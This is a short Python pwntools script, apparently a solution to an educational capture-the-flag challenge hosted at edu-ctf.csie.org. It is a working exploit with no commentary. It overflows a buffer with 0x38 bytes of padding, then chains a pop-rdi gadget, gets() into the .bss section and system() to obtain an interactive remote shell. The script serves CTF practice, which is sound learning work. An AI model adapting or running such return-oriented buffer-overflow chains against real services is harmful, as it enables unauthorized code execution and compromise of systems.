from pwn import *

context.update(arch='amd64', os='linux')

r = remote('edu-ctf.csie.org', 10174)

pop_rdi = 0x0000000000400733
system_plt = 0x0000000000400520
gets_plt = 0x0000000000400530
bss = 0x601090

payload = b"A"*0x38 + p64(pop_rdi) + p64(bss) + p64(gets_plt) + p64(pop_rdi) + p64(bss) + p64(system_plt)

r.recv()
r.sendline(payload)

r.interactive()
